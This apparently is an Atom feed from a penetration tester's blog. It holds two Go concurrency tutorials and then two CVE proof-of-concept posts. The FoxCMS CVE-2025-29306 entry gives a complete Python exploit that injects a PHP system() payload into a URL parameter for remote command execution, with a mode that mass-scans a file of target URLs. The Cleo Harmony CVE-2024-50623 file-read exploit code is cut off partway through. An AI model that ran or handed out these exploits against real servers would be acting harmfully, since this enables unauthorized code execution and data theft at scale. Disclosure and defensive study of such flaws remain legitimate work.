<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>congdong007</title>
  
  <subtitle>Penetration Test、Software Developer</subtitle>
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2025-08-16T15:01:09.427Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>Dong Cong</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Common worker pool patterns in Go</title>
    <link href="http://example.com/2025/08/16/common-work-pool-in-golang/"/>
    <id>http://example.com/2025/08/16/common-work-pool-in-golang/</id>
    <published>2025-08-16T14:49:08.000Z</published>
    <updated>2025-08-16T15:01:09.427Z</updated>
    
    <content type="html"><![CDATA[<ol><li><p>What is a Worker Pool?</p><ul><li><p>A worker pool is a concurrency pattern designed to control the number of goroutines executing tasks concurrently. Instead of spawning an unbounded goroutine for every incoming job—which may lead to excessive memory consumption and scheduler overhead—a worker pool pre-spawns a fixed number of workers (goroutines). Tasks are then dispatched to these workers via a shared queue.</p></li><li><p>Benefits:</p><ul><li><p>Limits resource usage by capping concurrency.</p></li><li><p>Prevents unbounded goroutine creation.</p></li><li><p>Provides a simple scheduling mechanism for tasks.</p></li></ul></li></ul></li><li><p>Common Worker Pool Implementations in Go</p><ul><li><p>(a) Channel-Based Pool</p><ul><li><p>This is the most idiomatic and straightforward implementation.</p></li><li><p>A channel acts as a job queue.</p></li><li><p>Workers are goroutines reading from this channel.</p></li><li><p>The main function submits tasks by sending them into the channel.</p></li><li><p>Example:</p>  <figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">jobs := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="type">int</span>, <span class="number">100</span>)</span><br><span class="line">results := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="type">int</span>, <span class="number">100</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> w := <span class="number">0</span>; w &lt; <span class="number">3</span>; w++ &#123;</span><br><span class="line">    <span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">(id <span class="type">int</span>)</span></span> &#123;</span><br><span class="line">        <span class="keyword">for</span> j := <span class="keyword">range</span> jobs &#123;</span><br><span class="line">            <span class="comment">// process job j</span></span><br><span class="line">            results &lt;- j * <span class="number">2</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;(w)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// submit jobs</span></span><br><span class="line"><span class="keyword">for</span> j := <span class="number">1</span>; j &lt;= <span class="number">5</span>; j++ &#123;</span><br><span class="line">    jobs &lt;- j</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">close</span>(jobs)</span><br></pre></td></tr></table></figure></li><li><p>This approach is best for bounded tasks where the job set is known in advance.</p></li></ul></li><li><p>(b) Channel + WaitGroup Pool</p><ul><li><p>A slightly more structured approach uses a sync.WaitGroup to wait for all workers to complete.</p></li><li><p>Workers continuously read from a job channel.</p></li><li><p>A WaitGroup ensures the main goroutine blocks until all jobs are finished.</p></li><li><p>This pattern is suited for long-running pipelines where tasks keep arriving dynamically.</p></li></ul></li><li><p>(c) Encapsulated Worker Pool</p><ul><li><p>In larger applications, it’s common to encapsulate the pool into a reusable type. For example:</p>  <figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> WorkerPool <span class="keyword">struct</span> &#123;</span><br><span class="line">    tasks <span class="keyword">chan</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span></span><br><span class="line">    wg    sync.WaitGroup</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">NewWorkerPool</span><span class="params">(n <span class="type">int</span>)</span></span> *WorkerPool &#123;</span><br><span class="line">    pool := &amp;WorkerPool&#123;tasks: <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span>)&#125;</span><br><span class="line">    pool.wg.Add(n)</span><br><span class="line">    <span class="keyword">for</span> i := <span class="number">0</span>; i &lt; n; i++ &#123;</span><br><span class="line">        <span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">            <span class="keyword">defer</span> pool.wg.Done()</span><br><span class="line">            <span class="keyword">for</span> task := <span class="keyword">range</span> pool.tasks &#123;</span><br><span class="line">                task()</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;()</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> pool</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(p *WorkerPool)</span></span> Submit(task <span class="function"><span class="keyword">func</span><span class="params">()</span></span>) &#123; p.tasks &lt;- task &#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(p *WorkerPool)</span></span> Shutdown()          &#123; <span class="built_in">close</span>(p.tasks); p.wg.Wait() &#125;</span><br></pre></td></tr></table></figure></li><li><p>This design allows submitting arbitrary functions and cleanly shutting down the pool. It is often used in task scheduling systems or background workers.</p></li></ul></li><li><p>(d) Using a Library (e.g., ants)</p><ul><li><p>For production-grade performance, developers often use libraries such as ants.</p></li><li><p>Provides a high-performance worker pool with memory reuse.</p></li><li><p>Significantly reduces garbage collection (GC) overhead compared to spawning millions of goroutines.</p></li><li><p>Simple API:</p>  <figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">p, _ := ants.NewPool(<span class="number">10</span>)</span><br><span class="line"><span class="keyword">defer</span> p.Release()</span><br><span class="line"></span><br><span class="line">p.Submit(<span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="comment">// task logic</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li><li><p>This is widely adopted in scenarios with high throughput and large task volumes.</p></li></ul></li></ul></li><li><p>Summary</p><ul><li><p>Channel-based pools: idiomatic and simple, good for small-scale concurrency.</p></li><li><p>Channel + WaitGroup: suitable for dynamic task streams.</p></li><li><p>Encapsulated worker pools: reusable and flexible, used in larger systems.</p></li><li><p>Third-party libraries (e.g., ants): optimized for high performance and reduced GC load.</p></li></ul></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;ol&gt;
&lt;li&gt;&lt;p&gt;What is a Worker Pool?&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;A worker pool is a concurrency pattern designed to control the number of goroutines execu</summary>
      
    
    
    
    <category term="Worker Pool" scheme="http://example.com/categories/Worker-Pool/"/>
    
    <category term="Go" scheme="http://example.com/categories/Worker-Pool/Go/"/>
    
    
  </entry>
  
  <entry>
    <title>Sharded Lock-Free MPSC Ring Buffers in Golang</title>
    <link href="http://example.com/2025/08/16/Lock-Free-golang/"/>
    <id>http://example.com/2025/08/16/Lock-Free-golang/</id>
    <published>2025-08-16T13:56:22.000Z</published>
    <updated>2025-08-16T14:37:44.909Z</updated>
    
    <content type="html"><![CDATA[<ol><li><p>Fundamental Concepts</p><ul><li><p>Ring Buffer</p><ul><li>A ring buffer (or circular buffer) is a fixed-size queue in which the write and read pointers wrap around once they reach the end of the underlying array. It is widely used in high-performance systems such as logging pipelines, network buffers, and message queues.</li></ul></li><li><p>MPSC (Multi-Producer, Single-Consumer)</p><ul><li><p>An MPSC queue allows multiple producers (writers) to insert elements concurrently, while only a single consumer (reader) retrieves elements.</p></li><li><p>Write operations must address concurrent access among producers.</p></li><li><p>Read operations are simpler, as they are performed by a single consumer thread.</p></li></ul></li><li><p>Lock-Free</p><ul><li>Instead of using traditional mutexes, lock-free structures rely on atomic operations (e.g., Compare-And-Swap, CAS) to ensure correctness under concurrency. This avoids lock contention, reducing latency and improving throughput.</li></ul></li><li><p>Sharded</p><ul><li>A sharded design partitions a large ring buffer into several smaller independent sub-buffers (shards). Producers are distributed across shards (e.g., by hashing or thread affinity), which minimizes contention. The consumer then sequentially or cyclically retrieves items from all shards.</li></ul></li></ul></li><li><p>Operating Principles</p><p> A sharded lock-free MPSC ring buffer typically operates as follows:</p><ul><li><p>Initialization</p><ul><li><p>The total buffer capacity is divided into N shards (e.g., 8 sub-buffers).</p></li><li><p>Each shard itself is implemented as a lock-free MPSC ring buffer.</p></li></ul></li><li><p>Producer Writes (Concurrent)</p><ul><li><p>Each producer selects a shard based on a hash function, producer ID, or randomized strategy.</p></li><li><p>The producer atomically advances the write pointer in that shard using CAS and writes its data.</p></li><li><p>Because writes are distributed across shards, contention is significantly reduced.</p></li></ul></li><li><p>Consumer Reads (Single Thread)</p><ul><li><p>The consumer iterates over all shards, checking each for available entries.</p></li><li><p>Data is retrieved by advancing the shard’s read pointer.</p></li><li><p>As only one consumer exists, no synchronization overhead is required for reading.</p></li></ul></li></ul></li><li><p>Motivation for Sharding</p><ul><li><p>Challenge with Conventional MPSC Buffers</p><ul><li>In a non-sharded MPSC buffer, all producers compete on a single shared write pointer, resulting in substantial contention under high concurrency.</li></ul></li><li><p>Benefits of Sharding</p><ul><li><p>Each shard has fewer competing producers, reducing contention on its write pointer.</p></li><li><p>The single consumer can still process data deterministically by scanning all shards.</p></li><li><p>Performance gains are particularly evident when the number of producers is large relative to the consumer.</p></li></ul></li></ul></li><li><p>Application Scenarios</p><ul><li><p>High-performance logging systems (multiple threads writing logs, one thread persisting to storage).</p></li><li><p>Network servers (multiple connections producing packets, one thread aggregating and processing them).</p></li><li><p>Data acquisition systems (multiple sensors producing input, one thread consuming for analysis).</p></li></ul></li><li><p>Implementation Notes in Golang</p><ul><li><p>In Go, the sync&#x2F;atomic package is typically used for lock-free synchronization.<br> Key implementation aspects include:</p></li><li><p>Write Operation</p></li></ul> <figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">idx := atomic.AddUint64(&amp;shard.writePos, <span class="number">1</span>) - <span class="number">1</span></span><br><span class="line">buffer[idx % shard.size] = value</span><br></pre></td></tr></table></figure><ul><li>Read Operation (single-threaded, no CAS required)</li></ul> <figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> shard.readPos &lt; shard.writePos &#123;</span><br><span class="line">    val := buffer[shard.readPos % shard.size]</span><br><span class="line">    shard.readPos++</span><br><span class="line">    <span class="keyword">return</span> val</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>Shard Selection</li></ul> <figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">shardID := hash(producerID) % numShards</span><br><span class="line">shard := shards[shardID]</span><br></pre></td></tr></table></figure><ul><li>Consumer Loop</li></ul> <figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> _, shard := <span class="keyword">range</span> shards &#123;</span><br><span class="line">        <span class="keyword">if</span> val, ok := shard.TryRead(); ok &#123;</span><br><span class="line">            process(val)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>Advantages and Limitations</p><ul><li><p>Advantages</p><ul><li><p>Lock-free design avoids mutex contention.</p></li><li><p>Sharding reduces producer contention and increases throughput.</p></li><li><p>Single-consumer semantics simplify design and maintain order within each shard.</p></li></ul></li><li><p>Limitations</p><ul><li><p>The consumer must poll multiple shards, which may increase latency with many shards.</p></li><li><p>Buffer utilization may be uneven if some shards are heavily loaded while others remain idle.</p></li><li><p>The design does not extend naturally to multiple consumers.</p></li></ul></li></ul></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;ol&gt;
&lt;li&gt;&lt;p&gt;Fundamental Concepts&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;Ring Buffer&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;A ring buffer (or circular buffer) is a fixed-size queue in which </summary>
      
    
    
    
    <category term="Go -Sharded Lock-Free MPSC Ring Buffers" scheme="http://example.com/categories/Go-Sharded-Lock-Free-MPSC-Ring-Buffers/"/>
    
    
    <category term="linux" scheme="http://example.com/tags/linux/"/>
    
    <category term="Go" scheme="http://example.com/tags/Go/"/>
    
  </entry>
  
  <entry>
    <title>FoxCMS v.1.2.5 allows a remote attacker to execute arbitrary code (CVE-2025-29306) POC</title>
    <link href="http://example.com/2025/04/28/FoxCMS-CVE-2025-29306/"/>
    <id>http://example.com/2025/04/28/FoxCMS-CVE-2025-29306/</id>
    <published>2025-04-28T04:09:34.000Z</published>
    <updated>2025-04-28T04:31:35.903Z</updated>
    
    <content type="html"><![CDATA[<pre><code>DescriptionPublished: 2025-03-27 Updated: 2025-03-27An issue in FoxCMS v.1.2.5 allows a remote attacker to execute arbitrary code via the case display page in the index.html component.Scope of impact:</code></pre><p>   <img src="/images/vuln12.jpg"></p><pre><code>Proof of Concept (Python Code)<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Title: FoxCMS v.1.2.5 allows a remote attacker to execute arbitrary code (CVE-2025-29306)</span></span><br><span class="line"><span class="comment"># Date : 2025-04-28</span></span><br><span class="line"><span class="comment"># Author: Dong Cong</span></span><br><span class="line"><span class="comment">#         </span></span><br><span class="line"><span class="comment">#         ZXJpYy5jb25nZG9uZ0BnbWFpbC5jb20=</span></span><br><span class="line"><span class="comment"># </span></span><br><span class="line"><span class="comment"># CVE-2025-29306</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line">import sys</span><br><span class="line">import urllib.parse</span><br><span class="line">import requests</span><br><span class="line">from lxml import html</span><br><span class="line">from concurrent.futures import ThreadPoolExecutor, as_completed</span><br><span class="line">from colorama import init, Fore, Style</span><br><span class="line"></span><br><span class="line"><span class="comment"># Initialize colorama</span></span><br><span class="line">init(autoreset=True)</span><br><span class="line"></span><br><span class="line">def load_urls(filename):</span><br><span class="line">    try:</span><br><span class="line">        with open(filename, <span class="string">&#x27;r&#x27;</span>) as f:</span><br><span class="line">            urls = [line.strip() <span class="keyword">for</span> line <span class="keyword">in</span> f <span class="keyword">if</span> line.strip()]</span><br><span class="line">        <span class="built_in">return</span> urls</span><br><span class="line">    except FileNotFoundError:</span><br><span class="line">        <span class="built_in">print</span>(Fore.RED + f<span class="string">&quot;[-] File not found: &#123;filename&#125;&quot;</span>)</span><br><span class="line">        sys.exit(1)</span><br><span class="line"></span><br><span class="line">def send_payload(target, <span class="built_in">command</span>):</span><br><span class="line">    payload = urllib.parse.quote(<span class="string">&#x27;$&#123;@print_r(@system(&quot;&#x27;</span> + <span class="built_in">command</span> + <span class="string">&#x27;&quot;))&#125;&#x27;</span>)</span><br><span class="line">    full_url = f<span class="string">&quot;&#123;target&#125;?id=&#123;payload&#125;&quot;</span></span><br><span class="line"></span><br><span class="line">    try:</span><br><span class="line">        response = requests.get(full_url, <span class="built_in">timeout</span>=10)</span><br><span class="line">        response.raise_for_status()</span><br><span class="line">        response.encoding = response.apparent_encoding</span><br><span class="line">    except Exception as e:</span><br><span class="line">        <span class="built_in">return</span> (target, False, f<span class="string">&quot;Request error: &#123;e&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line">    try:</span><br><span class="line">        tree = html.fromstring(response.text)</span><br><span class="line">        ul_element = tree.xpath(<span class="string">&quot;/html/body/header/div[1]/div[2]/div[1]/ul&quot;</span>)[0]</span><br><span class="line">        text_content = ul_element.text_content()</span><br><span class="line">        cleaned = <span class="string">&quot;\n&quot;</span>.<span class="built_in">join</span>([line.strip() <span class="keyword">for</span> line <span class="keyword">in</span> text_content.splitlines() <span class="keyword">if</span> line.strip()])</span><br><span class="line">        <span class="built_in">return</span> (target, True, cleaned)</span><br><span class="line">    except IndexError:</span><br><span class="line">        <span class="built_in">return</span> (target, False, <span class="string">&quot;&lt;ul&gt; element not found at specified XPath.&quot;</span>)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) &lt; 3:</span><br><span class="line">        <span class="built_in">print</span>(Fore.YELLOW + f<span class="string">&quot;Usage:&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(Fore.YELLOW + f<span class="string">&quot;  &#123;sys.argv[0]&#125; -f &lt;url.txt&gt; &lt;command&gt;&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(Fore.YELLOW + f<span class="string">&quot;  &#123;sys.argv[0]&#125; -u &lt;single_url&gt; &lt;command&gt;&quot;</span>)</span><br><span class="line">        sys.exit(1)</span><br><span class="line"></span><br><span class="line">    mode = sys.argv[1]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> mode == <span class="string">&#x27;-f&#x27;</span>:</span><br><span class="line">        <span class="keyword">if</span> len(sys.argv) != 4:</span><br><span class="line">            <span class="built_in">print</span>(Fore.RED + <span class="string">&quot;[-] Incorrect usage for file mode.&quot;</span>)</span><br><span class="line">            sys.exit(1)</span><br><span class="line">        url_file = sys.argv[2]</span><br><span class="line">        <span class="built_in">command</span> = sys.argv[3]</span><br><span class="line">        urls = load_urls(url_file)</span><br><span class="line">        <span class="built_in">print</span>(Fore.BLUE + f<span class="string">&quot;[*] Loaded &#123;len(urls)&#125; URLs from &#123;url_file&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line">        with ThreadPoolExecutor(max_workers=10) as executor:</span><br><span class="line">            futures = &#123;executor.submit(send_payload, url, <span class="built_in">command</span>): url <span class="keyword">for</span> url <span class="keyword">in</span> urls&#125;</span><br><span class="line">            completed = 0</span><br><span class="line">            total = len(urls)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> future <span class="keyword">in</span> as_completed(futures):</span><br><span class="line">                url = futures[future]</span><br><span class="line">                completed += 1</span><br><span class="line">                try:</span><br><span class="line">                    target, success, output = future.result()</span><br><span class="line">                    <span class="built_in">print</span>(Fore.BLUE + f<span class="string">&quot;\n[*] Progress: &#123;completed&#125;/&#123;total&#125;&quot;</span>)</span><br><span class="line">                    <span class="built_in">print</span>(f<span class="string">&quot;\n=== Result for &#123;Fore.YELLOW&#125;&#123;target&#125;&#123;Fore.RESET&#125; ===&quot;</span>)</span><br><span class="line">                    <span class="keyword">if</span> success:</span><br><span class="line">                        <span class="built_in">print</span>(Fore.GREEN + <span class="string">&quot;[+] Command Output:&quot;</span>)</span><br><span class="line">                        <span class="built_in">print</span>(output)</span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        <span class="built_in">print</span>(Fore.RED + f<span class="string">&quot;[-] Error: &#123;output&#125;&quot;</span>)</span><br><span class="line">                except Exception as e:</span><br><span class="line">                    <span class="built_in">print</span>(Fore.RED + f<span class="string">&quot;[-] Unexpected error with &#123;url&#125;: &#123;e&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">elif</span> mode == <span class="string">&#x27;-u&#x27;</span>:</span><br><span class="line">        <span class="keyword">if</span> len(sys.argv) != 4:</span><br><span class="line">            <span class="built_in">print</span>(Fore.RED + <span class="string">&quot;[-] Incorrect usage for single URL mode.&quot;</span>)</span><br><span class="line">            sys.exit(1)</span><br><span class="line">        url = sys.argv[2]</span><br><span class="line">        <span class="built_in">command</span> = sys.argv[3]</span><br><span class="line">        <span class="built_in">print</span>(Fore.BLUE + f<span class="string">&quot;[*] Target URL: &#123;url&#125;&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(Fore.BLUE + f<span class="string">&quot;[*] Sending RCE payload: &#123;command&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line">        target, success, output = send_payload(url, <span class="built_in">command</span>)</span><br><span class="line">        <span class="built_in">print</span>(f<span class="string">&quot;\n=== Result for &#123;Fore.YELLOW&#125;&#123;target&#125;&#123;Fore.RESET&#125; ===&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> success:</span><br><span class="line">            <span class="built_in">print</span>(Fore.GREEN + <span class="string">&quot;[+] Command Output:&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(output)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(Fore.RED + f<span class="string">&quot;[-] Error: &#123;output&#125;&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(Fore.RED + f<span class="string">&quot;[-] Unknown mode: &#123;mode&#125;&quot;</span>)</span><br><span class="line">        sys.exit(1)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br><span class="line">       </span><br></pre></td></tr></table></figure>The following code demonstrates how to execute the script:<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python test_poc.py -u http://192.168.0.1/images/index.html <span class="string">&quot;id&quot;</span></span><br><span class="line">python test_poc.py -f url.txt <span class="string">&quot;id&quot;</span></span><br></pre></td></tr></table></figure></code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;pre&gt;&lt;code&gt;Description

Published: 2025-03-27 Updated: 2025-03-27

An issue in FoxCMS v.1.2.5 allows a remote attacker to execute arbitrary </summary>
      
    
    
    
    <category term="vulnerability" scheme="http://example.com/categories/vulnerability/"/>
    
    <category term="FoxCMS v.1.2.5" scheme="http://example.com/categories/vulnerability/FoxCMS-v-1-2-5/"/>
    
    <category term="CVE-2025-29306" scheme="http://example.com/categories/vulnerability/FoxCMS-v-1-2-5/CVE-2025-29306/"/>
    
    
    <category term="CVE-2025-29306" scheme="http://example.com/tags/CVE-2025-29306/"/>
    
  </entry>
  
  <entry>
    <title>Cleo Harmony File Transfer Software Arbitrary File Read Vulnerability(CVE-2024-50623) POC</title>
    <link href="http://example.com/2025/04/01/Cleo-Harmony_CVE-2024-50623/"/>
    <id>http://example.com/2025/04/01/Cleo-Harmony_CVE-2024-50623/</id>
    <published>2025-04-01T18:53:15.000Z</published>
    <updated>2025-04-28T04:15:56.868Z</updated>
    
    <content type="html"><![CDATA[<pre><code>Description    Cleo has identified an unrestricted file upload and download vulnerability (CVE-2024-50623) that could lead to remote code execution.    The vulnerability affects the following products:    Cleo Harmony® (prior to version 5.8.0.21)    Cleo VLTrader® (prior to version 5.8.0.21)    Cleo LexiCom® (prior to version 5.8.0.21)    Cleo strongly advises all customers to immediately upgrade instances of Harmony, VLTrader, and LexiCom to the latest released patch (version 5.8.0.21) to address additional discovered potential attack vectors of the vulnerability.     Please visit Unrestricted File Upload and Download Vulnerability Mitigation to take immediate action.Scope of impact</code></pre><p>   <img src="/images/vuln11.jpg"></p><pre><code>Proof of Concept (Python Code)<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Title: Cleo Harmony File Transfer Software Arbitrary File Read Vulnerability(CVE-2024-50623)</span></span><br><span class="line"><span class="comment"># Date : 2025-04-01</span></span><br><span class="line"><span class="comment"># Author: Dong Cong</span></span><br><span class="line"><span class="comment">#         </span></span><br><span class="line"><span class="comment">#         ZXJpYy5jb25nZG9uZ0BnbWFpbC5jb20=</span></span><br><span class="line"><span class="comment"># </span></span><br><span class="line"><span class="comment"># CVE : 2024-50623</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#!/usr/bin/python3    </span></span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line">import argparse</span><br><span class="line">import warnings</span><br><span class="line"></span><br><span class="line">warnings.filterwarnings(<span class="string">&quot;ignore&quot;</span>)</span><br><span class="line"></span><br><span class="line">url0 = <span class="string">&#x27;/Synchronization&#x27;</span></span><br><span class="line"></span><br><span class="line">parser=argparse.ArgumentParser()</span><br><span class="line">parser.add_argument(<span class="string">&quot;--host&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;input the vulnerable host&quot;</span>, <span class="built_in">type</span>=str)</span><br><span class="line">args = parser.parse_args()</span><br><span class="line"></span><br><span class="line"><span class="comment"># http://xx.xx.xx.xx:xxxx</span></span><br><span class="line">host = args.host</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(host)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">cookies = &#123;</span><br><span class="line">    <span class="string">&#x27;csrftoken&#x27;</span>: <span class="string">&#x27;z1GtnjQWsIKwGazlFX7V&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;csrftoken&#x27;</span>: <span class="string">&#x27;NX6iujIUcamW9umprA1vx19dzU6EZNLa&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;csrftoken&#x27;</span>: <span 